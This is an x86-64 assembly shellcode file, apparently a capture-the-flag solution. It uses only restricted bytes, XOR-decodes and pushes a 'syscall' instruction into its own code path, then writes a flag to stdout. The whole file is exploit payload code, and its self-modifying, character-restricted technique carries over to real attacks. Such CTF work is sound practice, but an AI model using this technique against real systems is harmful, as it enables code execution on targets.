[bits 64]

push rdx ; shellcode address
pop rax
xor rax, 0x41414141
xor rax, 0x41414041 ; add 256 to rax (it works because it ends with 000)
push rax
pop rsp ; set stack pointer to the end of the shellcode

; put syscall into rcx
push 0x4142444e
pop rax
xor rax, 0x41414141
push rax
pop rcx

; move flag address to rsi
push r12 ; r12 contains _start address
pop rax
adc ax, 0xf60
push rax
pop rsi

;move flag length to rdx
push 0x43
pop rdx

; move 1 to rax and rdi
push 0x43434343
pop rax
xor rax, 0x43434342
push rax
pop rdi

times 16 push rcx ; push syscall multiple times, just to be sure

times (256 - ($-$$))/2 db 0x70,0x41 ; padding at the end, should act as nop (jo sth)
